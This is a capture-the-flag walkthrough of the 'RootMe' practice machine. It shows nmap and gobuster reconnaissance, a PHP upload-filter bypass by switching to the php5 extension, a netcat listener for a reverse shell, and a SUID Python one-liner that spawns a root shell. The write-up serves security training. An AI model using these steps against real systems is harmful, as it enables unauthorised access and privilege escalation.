# RootMe

![image](https://user-images.githubusercontent.com/44063862/94501784-3b849900-0235-11eb-924c-f15926a6864e.png)

## Penetration Testing Methodology

**Reconnaissance**
* nmap

**Enumeration**
* Directory enumeration using gobuster

**Exploitation**
* 

**Privilege Escalation**
* /usr/bin/python

**Capturing the flag**
* user.txt
* root.txt
_______________________________________________________________________________________________________

## Walkthrough

```
nmap -sC -sV 10.10.231.227
```

![image](https://user-images.githubusercontent.com/44063862/94507849-375f7800-0243-11eb-81ef-82e0e449c84c.png)

From the nmap scanning. I found that 2 port open. Which is
* 22 (ssh)
* 80 (http)

I browse the given IP address.

![image](https://user-images.githubusercontent.com/44063862/94501885-6838b080-0235-11eb-8aa9-bce47bb4f992.png)

But, there is nothing interesting. So, I decide to enumerate the directory. By using gobuster.

```
gobuster dir -u 10.10.231.227 -w /root/List/directory-list-2.3-medium.txt=
```

> list all directory or file 

![image](https://user-images.githubusercontent.com/44063862/94506088-2e6ca780-023f-11eb-8463-bb88096f6449.png)

Open the directory (http://10.10.231.227/p****/)

Seems like we can upload a file.

Upload reverseshell and run a listener

```
nc -nlvp 1234
```

![image](https://user-images.githubusercontent.com/44063862/94506867-fbc3ae80-0240-11eb-9d51-d13eca9a5d17.png)

Cannot upload php file. Lets try change to php5 or php4.

![image](https://user-images.githubusercontent.com/44063862/94506938-244ba880-0241-11eb-9352-51d46911123c.png)

Okay success.

![image](https://user-images.githubusercontent.com/44063862/94507014-5a892800-0241-11eb-9e86-071c775a3f5e.png)

Click and we will get into system.

```
find / -name user.txt 2>/dev/null
```

## Privilege Escalation

/usr/bin/python

```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```


CONGRATULATIONS!! This was a fun machine. Very basic yet fun to root. Good for beginner.

Thank you for reading. :)

**By _AdaniKamal_**

